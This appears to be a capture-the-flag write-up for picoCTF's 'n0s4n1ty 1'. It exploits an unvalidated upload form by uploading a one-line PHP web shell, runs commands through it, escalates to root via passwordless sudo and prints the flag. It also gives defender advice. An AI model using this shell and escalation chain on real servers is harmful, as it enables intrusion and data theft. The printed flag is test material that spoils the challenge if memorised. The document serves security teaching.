# n0s4n1ty 1 — Web Exploitation Writeup

**Category:** Web Exploitation (Easy)
**Challenge:** n0s4n1ty 1 (picoCTF 2025, by Prince Niyonshuti N.)
**Author:** Ooi

## Scenario

A website has a "profile picture upload" feature. The implementation is flawed — it doesn't sanitize or validate what gets uploaded (the challenge name, *n0s4n1ty* = "no sanity," gives this away). The objective is to abuse the upload to gain code execution on the server and read a flag stored in `/root`.

**Tools used:** Firefox, a one-line PHP web shell, `curl`

---

## Unrestricted upload to RCE to root (Easy)

**Objective:** Exploit the flawed profile-picture upload to achieve remote code execution, escalate to root, and read the flag in `/root`.

**Analysis:**

The page presents a single "Browse… / Upload Profile" form.

<img width="1919" height="1077" alt="image" src="https://github.com/user-attachments/assets/733fe9d2-587a-48c7-be49-6406a8ee5f7c" />

**Ruling out the client-side red herring.** The page source contains a `loadFile` function that calls `URL.createObjectURL(event.target.files[0])` to render a preview thumbnail. It's tempting to treat this as an XSS/client-side bug, but it isn't the vulnerability: `createObjectURL` runs entirely in the uploader's *own* browser on a file they selected themselves — there's no second victim and nothing is reflected to another user, so it can't reach a file on the server in `/root`.

<img width="569" height="337" alt="image" src="https://github.com/user-attachments/assets/c9bc1eb3-44e5-4e97-8f96-95271d3c7a2e" />

The objective (read a file on the server's filesystem) means the real flaw is **server-side**: how the upload is *handled*, not previewed. The challenge name — "no sanity" — points straight at missing input sanitization on the upload handler. This is a classic **unrestricted file upload** vulnerability.

**Exploitation — upload a PHP web shell.** The backend is PHP, so instead of an image I uploaded a one-line PHP web shell that executes any command passed in the `cmd` query parameter:

```php
<?php system($_GET['cmd']); ?>
```

saved as `payload.php`. The form accepted it without complaint — no extension check, no MIME check, no magic-byte check. That confirms the "no sanity" premise.

**Confirming code execution.** Uploaded profile pictures are served from `/uploads/`, so the shell landed at `/uploads/payload.php`. Browsing to it with a test command returns live command output:

```
http://xebec.cylabacademy.net:27935/uploads/payload.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<img width="1919" height="959" alt="image" src="https://github.com/user-attachments/assets/dc50d03a-01e9-47e5-a70b-26ad98722e2c" />

The server executed `id` and returned its output — **remote code execution** as the `www-data` web-server user.

**Privilege escalation.** The flag is in `/root`, unreadable by `www-data`. The next question is whether `www-data` can escalate. Checking its sudo rights:

```
http://xebec.cylabacademy.net:27935/uploads/payload.php?cmd=sudo -l
```

```
User www-data may run the following commands on challenge: (ALL) NOPASSWD: ALL
```

<img width="1918" height="1077" alt="image" src="https://github.com/user-attachments/assets/d88865f3-cb20-4978-9a52-d8d1d9a69be9" />

`(ALL) NOPASSWD: ALL` is a catastrophic misconfiguration — `www-data` can run **any** command as **any** user, including root, without a password. Prefixing any command with `sudo` runs it as root.

**Reading the flag.**

```
http://xebec.cylabacademy.net:27935/uploads/payload.php?cmd=sudo cat /root/flag.txt
```

```
academy{wh47_c4n_u_d0_wPHP_a93bcbae}
```

<img width="1915" height="1071" alt="image" src="https://github.com/user-attachments/assets/78e6893c-f779-4720-b6d6-639b15795864" />

**Finding:** The upload handler performed no validation on file type or content, allowing a PHP web shell to be uploaded to a web-served directory and executed — yielding RCE as `www-data`. A `sudo` misconfiguration (`NOPASSWD: ALL`) then allowed trivial escalation to root and disclosure of the flag in `/root`.

**Answer:** `academy{wh47_c4n_u_d0_wPHP_a93bcbae}`

*(The official picoCTF instance yields the equivalent `picoCTF{...}` flag; screenshots here are from the CyLab Academy mirror, which rebrands the prefix.)*

---

## Takeaways

- **Unrestricted file upload → web shell → RCE** is one of the most common real-world web attack chains. The whole exploit is: upload a server-executable script where an image was expected, then browse to it.
- **Match the vuln to the objective.** The goal was reading a server-side file, so a client-side preview bug (`createObjectURL`) couldn't be the path — it never leaves the uploader's browser. Always ask *"where does this code run, and can it reach the target?"* before chasing a lead.
- **The challenge name is a hint.** "n0s4n1ty" = no sanitization. Names, tags, and descriptions routinely telegraph the intended bug.
- **`sudo -l` is the first move after any foothold.** It instantly reveals whether the current user can escalate. `NOPASSWD: ALL` means instant root.
- **Minimal web shell:** `<?php system($_GET['cmd']); ?>` — command in the URL, output in the response. Use `curl "…?cmd=sudo%20cat%20/root/flag.txt"` from the terminal when the browser mangles spaces/slashes.
- **Defender's view (blue-team):** validate uploads by content not extension, store uploads outside the web root or with execution disabled, run the web server as an unprivileged user, and *never* grant `www-data` passwordless sudo. Each of those breaks a distinct link in this chain.

---
